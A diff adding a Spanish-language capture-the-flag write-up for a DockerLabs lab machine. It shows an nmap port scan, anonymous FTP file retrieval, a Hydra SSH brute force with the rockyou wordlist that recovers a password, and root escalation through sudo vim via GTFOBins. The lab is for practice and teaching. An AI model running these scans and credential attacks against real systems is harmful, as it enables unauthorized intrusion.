@@ -5,3 +5,58 @@ Luego de desplegar la maquina vulnerable vamos al siguiente paso.
 Se realizará un escaneo de puertos para identificar los servicios activos en la maquina 
 objetivo, utilizando Nmap con el siguiente parametro:
 sudo nmap -p- --open -sS -sCV --min-rate 5000 -Pn -n -oN obsession.txt 172.17.0.2
+
+Detalles del comando:
+•	-p-: Escaneo de todos los puertos.
+•	-sS: Escaneo SYN para determinar el estado de los puertos.
+•	-sCV: Usa scripts por defecto y detecta versiones de servicios.
+•	--min-rate 5000: Establece un ritmo mínimo de escaneo.
+•	-n: Desactiva la resolución DNS.
+•	-Pn: Omite la detección de hosts activos.
+•	-oN obsession.txt: Guarda los resultados en el archivo “obsession.txt”.
+Descubriendose los siguientes puertos 
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+
+Enumeración Web, 
+Visitando la dirección 172.17.0.2 por el protocolo http resuelve el sitio web detallado en la imagen: “http-title: Russoski Coaching”
+ 
+Al final de la pagina se encuentra una cuenta de correo: russoski@dockerlabs.es
+
+ 
+Asumiendo que el alias “russoski” es una cuenta de usuario
+
+Enumeración FTP 
+
+ftp 172.17.0.2
+# anonymous / (vacío)
+get chat-gonza.txt
+get pendientes.txt
+ 
+ 
+cat chat-gonza.txt
+cat pendientes.txt
+ 
+En el primer archive se encuentra una conversación entre los posibles usuarios Gonza y Russoski
+Fuerza bruta:
+Con estos posibles usuarios se realizará un ataque de fuerza bruta con Hydra y el siguiente comando:
+hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
+ 
+
+Credenciales encontradas: russoski:iloveme
+Ahora con las credenciales levantamos sesión por SSH
+
+Tenemos sesión con el usuario russoski
+
+Ahora escalaremos los privilegios del usuario
+ 
+russoski puede ejecutar /usr/bin/vim como root sin contraseña. Usando GTFOBins:
+ 
+Root conseguido
+
+
+
+
+
